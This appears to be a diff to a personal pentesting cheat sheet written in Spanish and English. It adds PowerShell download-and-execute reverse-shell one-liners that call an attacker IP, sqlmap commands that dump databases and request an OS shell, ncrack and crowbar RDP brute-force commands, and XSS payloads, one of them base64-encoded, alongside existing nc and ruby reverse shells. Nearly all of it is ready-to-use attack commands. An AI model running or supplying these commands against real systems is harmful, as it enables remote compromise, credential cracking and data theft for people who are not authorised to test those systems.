@@ -22,8 +22,16 @@ TRANSFERENCIA DE ARCHIVOS
 
 sudo python -m http.server 80
 sudo python -m SimpleHTTPServer 80
-    Para conectarse: via web o si la maquina es windows: powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
-    O tambien... Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+
+     Target Linux: 
+         wget http://[IP]/recurso
+         
+     Target Windows:
+         powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
+         Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
+         powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+         powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+         
 sudo python smbserver.py [como se llamara el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/user
     Para conectarse: copy \\IP\recurso
 
@@ -92,6 +100,9 @@ ruby -rsocket -e'f=TCPSocket.open("8.8.8.8",8080).to_i;exec sprintf("/bin/sh -i 
 // Netcat
 nc -e /bin/sh 8.8.8.8 8080
 
+// PowerShell
+https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
+
 
 WEB SHELL
 ..........
@@ -110,6 +121,7 @@ COMMON PORTS
 143 - IMAP
 80 - HTTP
 443 - HTTPS
+8080 - HTTP Proxy
 137, 138, 139 - NETBIOS
 115 - SFTP
 23 - Telnet
@@ -118,6 +130,11 @@ COMMON PORTS
 3306 - MySQL
 1433 - MS SQL Server
 445 - SMB
+123 - NTP
+179 - BGP
+69 - TFTP
+88 - Kerberos
+102 - MS Exchange
 
 
 HOW TO SET ROUTE
@@ -137,13 +154,21 @@ nc -nv  <IP> <port>
 SQLMAP
 .......
 
-sqlmap -u http://<IP address> -p parameter
+sqlmap -u http://[IP] -p parameter
 
-sqlmap -u http://<IP address> –os-shell
+sqlmap -u http://[IP] –os-shell
 
-sqlmap -u http://<IP address> –dump
+sqlmap -u http://[IP] –dump
 
-https://hackersonlineclub.com/sql-injection-cheatsheet/
+sqlmap -u http://[IP]/?id=1 --dbs
+
+sqlmap -u http://[IP]/?id=1 -D database_name --tables
+
+sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns
+
+sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all
+
+More....https://hackersonlineclub.com/sql-injection-cheatsheet/
 
 
 CRACKING PASSWORDS/LOGIN WEB
@@ -291,7 +316,12 @@ Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con po
 RDP
 ....
 
+xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
 xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
+
+ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login
+
+crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking 
 
 
 VULNERABILIDAD LOG4J
@@ -313,4 +343,31 @@ DESCARGA DE ARCHIVOS POR COMANDO
 
 Linux --> wget [URL]
 Windows --> powershell -c "Invoke-WebRequest -Uri '[URL]'" -OutFile archivo
+
+
+XSS
+....
+
+<script>alert('Found')</script>
+"><script>alert(Found)</script>">
+<script>alert(String.fromCharCode(88,83,83))</script>
+"  onload="alert(String.fromCharCode(88,83,83))
+" onload="alert('XSS')
+<img src='bla' onerror=alert("XSS")>
+
+      Mario Bros XSS
+         <iframe src="https://jcw87.github.io/c2-smb1/" width="100%" height="600"></iframe>
+         <input onfocus="document.body.innerHTML=atob('PGlmcmFtZSBzcmM9Imh0dHBzOi8vamN3ODcuZ2l0aHViLmlvL2MyLXNtYjEvIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI2MDAiPjwvaWZyYW1lPg==')" autofocus>
+         
+  
+WORDLISTS
+..........
+
+PacketStorm
+SecList
+cotse
+DefaultPassword
+RouterPassword
+Pastebin
+RainbowCrack
 
